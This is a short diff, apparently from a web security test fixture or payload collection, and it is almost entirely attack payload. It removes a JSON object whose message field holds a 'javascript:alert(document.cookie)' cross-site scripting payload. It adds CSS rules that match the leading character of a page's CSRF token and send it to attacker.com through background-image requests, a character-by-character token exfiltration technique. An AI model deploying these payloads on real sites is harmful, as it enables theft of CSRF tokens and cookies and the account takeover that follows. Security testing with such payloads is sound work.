@@ -1,8 +1,9 @@
-{
-  "swagger": "2.0",
-  "openapi": "3.0.0",
-  "status": true,
-  "code": "E996",
-  "msg": "javascript:alert(document.cookie)",
-  "data": {}
+input[name=csrf][value^=a]{
+    background-image: url(https://attacker.com/exfil/a);
+}
+input[name=csrf][value^=b]{
+    background-image: url(https://attacker.com/exfil/b);
+}
+input[name=csrf][value^=9]{
+    background-image: url(https://attacker.com/exfil/9);
 }
